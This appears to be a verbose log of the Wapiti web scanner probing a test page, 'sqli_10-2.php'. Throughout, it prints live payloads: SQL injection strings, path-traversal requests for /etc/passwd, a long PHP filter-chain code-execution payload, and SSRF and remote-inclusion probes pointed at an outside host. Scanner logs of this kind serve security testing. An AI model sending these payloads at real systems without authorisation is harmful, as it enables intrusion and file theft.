2024-03-20 16:42:43.941 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:44.073 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-20 16:42:44.073 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_45f7a44d.db
2024-03-20 16:42:44.078 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-20 16:42:44.133 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-20 16:42:44.134 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-20 16:42:44.254 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-20 16:42:44.256 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-20 16:42:44.257 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-20 16:42:44.272 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:44.285 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-20 16:42:44.367 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-20 16:42:44.376 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:44.377 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_10-2.php?title=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F8vtc5y%2F1%2F7469746c65%2F (0)
2024-03-20 16:42:44.405 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=8vtc5y for results, please wait...
2024-03-20 16:42:46.560 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-20 16:42:46.577 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:46.577 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_10-2.php?title=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 16:42:46.590 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/sqli_10-2.php?title=%2F%2Fopenbugbounty.org%2F
2024-03-20 16:42:46.626 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-20 16:42:46.658 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-20 16:42:46.669 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:46.669 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/sqli_10-2.php?title=fuzz%C2%BF%27%22%28 (0)
2024-03-20 16:42:46.688 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_10-2.php?title=fuzz%20AND%2024%3D75%20AND%2019%3D19 (0)
2024-03-20 16:42:46.697 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_10-2.php?title=fuzz%27%20AND%2023%3D72%20AND%20%2735%27%3D%2735 (0)
2024-03-20 16:42:46.706 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_10-2.php?title=fuzz%22%20AND%2010%3D35%20AND%20%2223%22%3D%2223 (0)
2024-03-20 16:42:46.716 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_10-2.php?title=fuzz%29%20AND%2083%3D149%20AND%20%2885%3D85 (0)
2024-03-20 16:42:46.727 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_10-2.php?title=fuzz%27%29%20AND%2081%3D101%20AND%20%28%2744%27%3D%2744 (0)
2024-03-20 16:42:46.737 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_10-2.php?title=fuzz%27%29%20AND%2096%3D130%20AND%20%28%2794%27%3D%2794 (0)
2024-03-20 16:42:46.749 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_10-2.php?title=fuzz%27%29%20AND%2059%3D59%20AND%20%28%2738%27%3D%2738 (0)
2024-03-20 16:42:46.758 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/sqli_10-2.php?title=fuzz%22%29%20AND%2027%3D109%20AND%20%28%2273%22%3D%2273 (0)
2024-03-20 16:42:46.789 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-20 16:42:46.799 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:46.799 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
2024-03-20 16:42:46.799 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
2024-03-20 16:42:46.838 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
2024-03-20 16:42:46.896 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-20 16:42:46.911 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_10-2.php?title=fuzz (0)
2024-03-20 16:42:46.915 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-20 16:42:46.927 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-20 16:42:46.941 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=%2Fetc%2Fpasswd (0)
2024-03-20 16:42:46.955 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=%2Fetc%2Fpasswd%00 (0)
2024-03-20 16:42:46.965 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=%2Fetc%2Fservices (0)
2024-03-20 16:42:46.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:46.985 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 16:42:46.994 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-20 16:42:47.003 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-20 16:42:47.015 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 16:42:47.025 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.035 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-20 16:42:47.046 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-20 16:42:47.057 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-20 16:42:47.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 16:42:47.082 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 16:42:47.095 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 16:42:47.107 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 16:42:47.117 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 16:42:47.129 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 16:42:47.138 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.149 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.159 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 16:42:47.168 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 16:42:47.179 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.192 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.202 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-20 16:42:47.211 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 16:42:47.219 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 16:42:47.226 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 16:42:47.236 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 16:42:47.249 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 16:42:47.260 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 16:42:47.271 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.284 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.296 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 16:42:47.311 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 16:42:47.321 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.333 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 16:42:47.352 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 16:42:47.362 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 16:42:47.371 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 16:42:47.379 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 16:42:47.389 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 16:42:47.398 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.409 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.418 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 16:42:47.427 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 16:42:47.436 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.446 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.456 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-20 16:42:47.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 16:42:47.476 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-20 16:42:47.485 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-20 16:42:47.494 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-20 16:42:47.503 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 16:42:47.522 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 16:42:47.531 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=sqli_10-2.php (0)
2024-03-20 16:42:47.543 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_10-2.php?title=sqli_10-2.php%00 (0)
